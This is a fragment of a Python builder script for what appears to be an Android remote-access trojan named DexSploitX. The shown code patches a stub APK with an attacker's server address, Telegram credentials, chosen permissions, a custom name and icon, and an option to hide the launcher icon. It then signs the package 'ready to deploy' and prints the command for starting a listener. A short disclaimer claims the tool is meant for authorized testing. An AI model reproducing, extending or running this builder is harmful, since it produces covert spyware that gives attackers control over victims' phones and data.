        print(f"{Colors.CYAN}APK:{Colors.END}          {final_apk}")
        print(f"{Colors.CYAN}Size:{Colors.END}         {size_mb:.2f} MB")
        print(f"{Colors.CYAN}App Name:{Colors.END}     {self.config['app_name']}")
        print(f"{Colors.CYAN}Package:{Colors.END}      {self.config['package']}")
        print(f"{Colors.CYAN}Server:{Colors.END}       {self.config['ip']}:{self.config['port']}")
        print(f"{Colors.CYAN}Website:{Colors.END}      {self.config['website']}")
        print(f"{Colors.CYAN}Permissions:{Colors.END}  {len(self.config.get('permissions', []))} selected")
        print(f"{Colors.CYAN}Hidden:{Colors.END}       {'Yes (no launcher icon)' if self.config.get('hide_app', False) else 'No (visible in launcher)'}")
        print(f"{Colors.BOLD}{Colors.GREEN}═══════════════════════════════════════════════════════════{Colors.END}")
        print(f"\n{Colors.BOLD}{Colors.YELLOW}[*] START LISTENER:{Colors.END}")
        print(f"{Colors.GREEN}    python DexSploitX.py -i {self.config['ip']} -p {self.config['port']}{Colors.END}")
        print(f"\n{Colors.BOLD}{Colors.RED}[!] DISCLAIMER:{Colors.END}")
        print(f"{Colors.YELLOW}    This tool is for AUTHORIZED SECURITY TESTING ONLY.{Colors.END}")
        print(f"{Colors.YELLOW}    Unauthorized access to devices is ILLEGAL.{Colors.END}")
        print(f"{Colors.YELLOW}    The developer assumes NO responsibility for misuse.{Colors.END}\n")
        
        return final_apk
    
    def run(self):
        """Main build process"""
        self.print_banner()
        
        if not self.check_requirements():
            return
        
        if not self.get_config():
            return
        
        # Update config.json with Telegram credentials
        if not self.update_config_json():
            return
        
        # Create working directory (copy of stub)
        if not self.create_working_directory():
            return
        
        try:
            print(f"{Colors.CYAN}[*] Applying configuration...{Colors.END}", end='', flush=True)
            
            if not self.modify_server_config():
                return
            
            if not self.modify_manifest():
                return
            
            if not self.modify_strings():
                return
            
            if not self.modify_mainactivity():
                return
            
            if not self.modify_permissions():
                return
            
            print(f"\r{Colors.GREEN}[✓] Configuration applied{Colors.END}" + " " * 30)
            
            print(f"{Colors.CYAN}[*] Preparing resources...{Colors.END}", end='', flush=True)
            
            if not self.clean_icon_conflicts():
                return
            
            if not self.change_icon():
                return
            
            print(f"\r{Colors.GREEN}[✓] Resources prepared{Colors.END}" + " " * 30)
            
            unsigned_apk = self.rebuild_apk()
            if not unsigned_apk:
                return
            
            signed_apk = self.sign_apk(unsigned_apk)
            if not signed_apk:
                return
            
            final_apk = self.copy_to_output(signed_apk)
            
            print(f"{Colors.GREEN}[✓] Build complete! APK ready to deploy.{Colors.END}\n")
            
        finally:
            # Always cleanup working directory
            self.cleanup_working_directory()

def main():
    # Auto-setup environment
    auto_setup()
    
    try:
        builder = DexSploitXBuilder()
        builder.run()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[!] Build cancelled{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}[!] Error: {e}{Colors.END}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
